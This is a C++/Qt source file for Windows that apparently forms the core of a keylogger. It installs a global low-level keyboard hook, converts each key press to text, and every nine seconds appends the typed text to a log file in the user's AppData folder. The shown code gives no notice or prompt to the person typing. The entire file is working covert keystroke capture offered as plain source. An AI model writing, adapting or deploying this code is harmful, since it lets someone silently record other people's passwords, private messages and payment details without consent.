#include "core.h"

static HHOOK hHook = nullptr;
static QByteArray outputBuffer;
static QFile output;

Core::Core(QObject *parent) :
    QObject(parent)
{
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, process, nullptr, 0);

    if (hHook == nullptr) {
        QCoreApplication::exit(1);
    }

    QString outputDirPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation);
    QDir outputDir = QDir(outputDirPath);

    if (!outputDir.exists()) {
        outputDir.mkdir(outputDir.absolutePath());
    }

    QString outputPath = outputDir.absolutePath() + QDir::separator() + QString(OUTPUT_NAME);
    output.setFileName(outputPath);

    if (!output.open(QFile::Append | QFile::Text)) {
        QCoreApplication::exit(1);
    }

    QTimer *timer = new QTimer();
    QObject::connect(timer, &QTimer::timeout, Core::writeOutput);
    timer->start(9000);
}

Core::~Core()
{
    if (output.isOpen()) {
        writeOutput();
        output.close();
    }
}

void Core::update(BYTE *keyState, int keyCode)
{
    keyState[keyCode] = BYTE(GetKeyState(keyCode));
}

LRESULT CALLBACK Core::process(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT key = *((KBDLLHOOKSTRUCT *) lParam);

        wchar_t buffer[6];
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        update(keyboardState, VK_SHIFT);
        update(keyboardState, VK_CAPITAL);
        update(keyboardState, VK_CONTROL);
        update(keyboardState, VK_MENU);

        HKL keyboardLayout = GetKeyboardLayout(0);
        char lpszName[0x100] = {0};
        DWORD dWordMessage = 1;
        dWordMessage += key.scanCode << 16;
        dWordMessage += key.flags << 24;

        int i = GetKeyNameText(dWordMessage, (LPTSTR) lpszName, 255);
        int result = ToUnicodeEx(key.vkCode, key.scanCode, keyboardState, buffer, 5, 0, keyboardLayout);
        buffer[5] = L'\0';

        QString toBeAppended;

        if (i == 5) {
            QString keyString = QString::fromUtf16((ushort *) lpszName);

            if (keyString == "ENTER") {
                toBeAppended = "\n[" + keyString + "]\n";
            } else {
                toBeAppended = QString::fromUtf16((ushort *) buffer);
            }

        } else {
            toBeAppended = QString::fromUtf16((ushort *) buffer);
        }

        outputBuffer.append(toBeAppended);
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void Core::writeOutput()
{
    if (!outputBuffer.isEmpty()) {
        QTextStream outputStream(&output);
        outputStream << outputBuffer << endl;
        outputBuffer.clear();
    }
}
